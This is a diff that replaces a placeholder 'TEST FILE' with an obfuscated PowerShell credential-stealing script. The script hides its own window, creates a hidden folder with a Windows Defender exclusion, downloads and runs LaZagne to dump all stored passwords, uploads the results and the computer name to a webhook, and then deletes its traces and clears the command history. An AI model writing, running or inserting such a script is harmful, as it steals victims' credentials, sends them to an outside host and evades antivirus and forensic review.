@@ -1,1 +1,85 @@
-TEST FILE
+function Set-WindowState {
+    [CmdletBinding(DefaultParameterSetName = 'InputObject')]
+    param(
+        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
+        [Object[]] $wqGjobDF,
+
+        [Parameter(Position = 1)]
+        [ValidateSet('FORCEMINIMIZE', 'HIDE', 'MAXIMIZE', 'MINIMIZE', 'RESTORE',
+                     'SHOW', 'SHOWDEFAULT', 'SHOWMAXIMIZED', 'SHOWMINIMIZED',
+                     'SHOWMINNOACTIVE', 'SHOWNA', 'SHOWNOACTIVATE', 'SHOWNORMAL')]
+        [string] $9CPJ9goquVYxEyJ8cRYI3t2 = 'SHOW',
+        [switch] $CbHxGxLw9TD = $false,
+        [switch] $OvgoGmsM = $false
+    )
+
+    Begin {
+        $UfRS6lx8Nv = @{
+        'FORCEMINIMIZE'         = 11
+            'HIDE'              = 0
+            'MAXIMIZE'          = 3
+            'MINIMIZE'          = 6
+            'RESTORE'           = 9
+            'SHOW'              = 5
+            'SHOWDEFAULT'       = 10
+            'SHOWMAXIMIZED'     = 3
+            'SHOWMINIMIZED'     = 2
+            'SHOWMINNOACTIVE'   = 7
+            'SHOWNA'            = 8
+            'SHOWNOACTIVATE'    = 4
+            'SHOWNORMAL'        = 1
+        }
+
+        $G0aLJstHhWKE = Add-Type -MemberDefinition @'
+[DllImport("user32.dll")]
+public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
+[DllImport("user32.dll", SetLastError = true)]
+public static extern bool SetForegroundWindow(IntPtr hWnd);
+'@ -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru
+
+        if (!$FH7Ou2ptm8kIJwxlqfWYo:MainWindowHandles) {
+            $FH7Ou2ptm8kIJwxlqfWYo:MainWindowHandles = @{ }
+        }
+    }
+
+    Process {
+        foreach ($l7bixVQE in $wqGjobDF) {
+            $i = $l7bixVQE.MainWindowHandle
+
+            if ($i -eq 0 -and $FH7Ou2ptm8kIJwxlqfWYo:MainWindowHandles.ContainsKey($l7bixVQE.Id)) {
+                $i = $FH7Ou2ptm8kIJwxlqfWYo:MainWindowHandles[$l7bixVQE.Id]
+            }
+
+            if ($i -eq 0) {
+                if (-not $CbHxGxLw9TD) {
+                    Write-Error "Main Window handle is '0'"
+                }
+                continue
+            }
+
+            $FH7Ou2ptm8kIJwxlqfWYo:MainWindowHandles[$l7bixVQE.Id] = $i
+
+            $G0aLJstHhWKE::ShowWindowAsync($i, $UfRS6lx8Nv[$9CPJ9goquVYxEyJ8cRYI3t2]) | Out-Null
+            if ($OvgoGmsM) {
+                $G0aLJstHhWKE::SetForegroundWindow($i) | Out-Null
+            }
+
+            Write-Verbose ("Set Window State '{1} on '{0}'" -f $05SPsqrfGu36C, $9CPJ9goquVYxEyJ8cRYI3t2)
+        }
+    }
+}
+
+Set-Alias -Name 'Set-WindowStyle' -Value 'Set-WindowState'
+Get-Process -ID $PID | Set-WindowState -State HIDE
+$WiKGeNVwP3CLI1pQnOyl = "C:\Users\$IHxTClyaMd2geQqnc9:UserName\Downloads\tmp"
+New-Item -ItemType Directory -Path $WiKGeNVwP3CLI1pQnOyl
+Add-MpPreference -ExclusionPath $WiKGeNVwP3CLI1pQnOyl
+$El4iDx5 = Get-Item $WiKGeNVwP3CLI1pQnOyl -Force
+$El4iDx5.attributes='Hidden'
+Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "$WiKGeNVwP3CLI1pQnOyl\lazagne.exe"
+& "$WiKGeNVwP3CLI1pQnOyl\lazagne.exe" all > "$WiKGeNVwP3CLI1pQnOyl\output.txt"
+$cP1=@{ content = "$IHxTClyaMd2geQqnc9:computername Stats"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $qx3S9Eygl6wiD8pPX1  -Method Post -Body ($cP1 | ConvertTo-Json);curl.exe -F "file1=@$WiKGeNVwP3CLI1pQnOyl/output.txt" $qx3S9Eygl6wiD8pPX1 
+Remove-Item -Path $WiKGeNVwP3CLI1pQnOyl -Recurse -Force
+Set-MpPreference -DisableRealtimeMonitoring $false
+Remove-MpPreference -ExclusionPath $WiKGeNVwP3CLI1pQnOyl
+Clear-History
